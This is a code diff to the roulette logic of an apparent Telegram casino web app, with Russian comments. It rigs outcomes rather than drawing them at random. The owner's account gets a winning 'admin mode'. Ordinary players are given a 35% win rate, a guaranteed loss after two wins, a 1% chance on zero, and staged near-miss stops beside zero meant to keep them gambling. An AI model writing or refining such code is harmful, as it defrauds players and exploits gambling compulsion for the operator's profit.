@@ -173,7 +173,7 @@
         let forceNearMiss = false; 
         let targetPool = [];
     
-        // 1. РЕЖИМ БОГА (ДЛЯ АДМИНА)
+        // 1. РЕЖИМ АДМИНА
         if (currentUserId === MY_TELEGRAM_ID) {
             adminSpinCount++;
             let filterColor = (adminSpinCount % 2 === 0) ? betType : null;
@@ -183,38 +183,35 @@
             });
             winningNumber = winningNumbers[Math.floor(Math.random() * winningNumbers.length)];
         } 
-        // 2. ЗАЩИЩЕННЫЙ МАРКЕТИНГОВЫЙ АЛГОРИТМ
+        // 2. ДЛЯ ОБЫЧНЫХ ИГРОКОВ (ЖЕСТКИЙ СЛИВНОЙ МАТЕМАТИЧЕСКИЙ АЛГОРИТМ)
         else {
-            let session = JSON.parse(localStorage.getItem('tg_casino_session')) || { spins: 0, winStreak: 0, lossStreak: 0 };
-            session.spins++;
+            let session = JSON.parse(localStorage.getItem('tg_casino_session')) || { winStreak: 0, lossStreak: 0 };
 
             let shouldWin = false;
             const roll = Math.random();
 
-            // 🛡️ УЛУЧШЕННЫЙ АНТИ-АБУЗ ЗЕРО (БЕЗ ПОВТОРЯЮЩИХСЯ ПАТТЕРНОВ)
+            // ЗАЩИТА НА ЗЕРО (Шанс удержания всего 1%)
             if (betType === 'zero') {
-                shouldWin = roll < 0.015; // Чистый шанс удержания 1.5%
-
+                shouldWin = roll < 0.01; 
                 if (shouldWin) {
                     targetPool = [0];
                 } else {
-                    // Больше никакого спама числами 32 и 26! 
-                    // Бот выбирает абсолютно любое число на колесе, кроме нуля. Игрок не вычислит систему.
                     targetPool = order.filter(num => num !== 0);
-                    forceNearMiss = true; // Триггер микро-сдвига сработает красиво, только если выпадет 32 или 26
+                    forceNearMiss = true; 
                 }
             } 
-            // КЛАССИЧЕСКИЙ МАРКЕТИНГ ДЛЯ СТАВОК НА ЦВЕТ Х2 (Красное / Черное)
+            // ЖЕСТКИЙ КОНТРОЛЬ СТАВОК НА ЦВЕТ (Красное / Черное)
             else {
-                if (session.spins <= 3) {
-                    shouldWin = roll < 0.80; 
-                } else if (session.lossStreak >= 2) {
-                    shouldWin = roll < 0.65; 
-                } else if (session.winStreak >= 2) {
+                if (session.winStreak >= 2) {
+                    // Стоп-кран: выиграл 2 раза подряд? Третий раз ГАРАНТИРОВАННО сливаешь.
                     shouldWin = false;
                     forceNearMiss = true;    
+                } else if (session.lossStreak >= 3) {
+                    // Поддерживаем азарт: если слил 3 раза подряд, даем шанс 50% отбить часть денег
+                    shouldWin = roll < 0.50; 
                 } else {
-                    shouldWin = roll < 0.40; 
+                    // Базовый игровой режим: шанс выиграть всего 35% (65% в пользу вашего казино!)
+                    shouldWin = roll < 0.35; 
                     if (!shouldWin) forceNearMiss = Math.random() < 0.6;
                 }
 
@@ -223,19 +220,13 @@
                     return shouldWin ? color === betType : color !== betType;
                 });
 
+                // Красивый визуальный промах
                 if (forceNearMiss && !shouldWin) {
                     let nearMissNumbers = targetPool.filter(num => {
                         let idx = order.indexOf(num);
                         let prevIdx = (idx - 1 + 37) % 37;
                         let nextIdx = (idx + 1) % 37;
-                        
-                        let prevNum = order[prevIdx];
-                        let nextNum = order[nextIdx];
-                        
-                        let prevColor = prevNum === 0 ? 'zero' : (RED_NUMBERS.includes(prevNum) ? 'red' : 'black');
-                        let nextColor = nextNum === 0 ? 'zero' : (RED_NUMBERS.includes(nextNum) ? 'red' : 'black');
-                        
-                        return prevColor === betType || nextColor === betType;
+                        return order[prevIdx] === 0 || order[nextIdx] === 0;
                     });
                     if (nearMissNumbers.length > 0) {
                         targetPool = nearMissNumbers;
@@ -245,6 +236,7 @@
 
             winningNumber = targetPool[Math.floor(Math.random() * targetPool.length)];
 
+            // Обновляем статистику сессии
             if (shouldWin) {
                 session.winStreak++;
                 session.lossStreak = 0;
@@ -258,32 +250,15 @@
         let finalColor = winningNumber === 0 ? 'zero' : (RED_NUMBERS.includes(winningNumber) ? 'red' : 'black');
         const isWin = finalColor === betType;
 
-        // --- ВЫЧИСЛЕНИЕ ФИНАЛЬНОЙ ТОЧКИ АНИМАЦИИ ---
+        // АНИМАЦИЯ ВРАЩЕНИЯ
         tape.style.transition = 'none';
         
         const baseIndex = order.indexOf(winningNumber);
         const minCircles = 6; 
         const targetIndex = baseIndex + (37 * minCircles); 
-        
         const containerWidth = document.querySelector('.roulette-container').offsetWidth;
         
-        let randomInnerOffset = 0;
-        if (forceNearMiss && !isWin) {
-            let checkIdx = order.indexOf(winningNumber);
-            let nextIdx = (checkIdx + 1) % 37;
-            let nextNum = order[nextIdx];
-            let nextColor = nextNum === 0 ? 'zero' : (RED_NUMBERS.includes(nextNum) ? 'red' : 'black');
-            
-            // Плавная остановка на грани фола, если выпали реальные соседи Зеро (32 или 26)
-            if (nextColor === betType || (betType === 'zero' && (winningNumber === 32 || winningNumber === 26))) {
-                randomInnerOffset = (winningNumber === 32) ? -21 : 21; 
-            } else {
-                randomInnerOffset = Math.floor(Math.random() * 26) - 13;
-            }
-        } else {
-            randomInnerOffset = Math.floor(Math.random() * 26) - 13; 
-        }
-
+        let randomInnerOffset = Math.floor(Math.random() * 26) - 13;
         const targetX = -(targetIndex * cellWidth - containerWidth / 2 + cellWidth / 2 + randomInnerOffset);
     
         setTimeout(() => {
@@ -298,9 +273,7 @@
                 spin_result: winningNumber,
                 win: isWin
             };
-            
             tg.sendData(JSON.stringify(betData));
-            
             isSpinning = false;
             document.querySelectorAll('.bet-btn, .btn-topup').forEach(b => b.disabled = false);
         }, 4500);
@@ -308,8 +281,7 @@
 
     function triggerTopUp() {
         if (isSpinning) return;
-        const topupData = { action: "request_topup" };
-        tg.sendData(JSON.stringify(topupData));
+        tg.sendData(JSON.stringify({ action: "request_topup" }));
     }
 </script>
 </body>
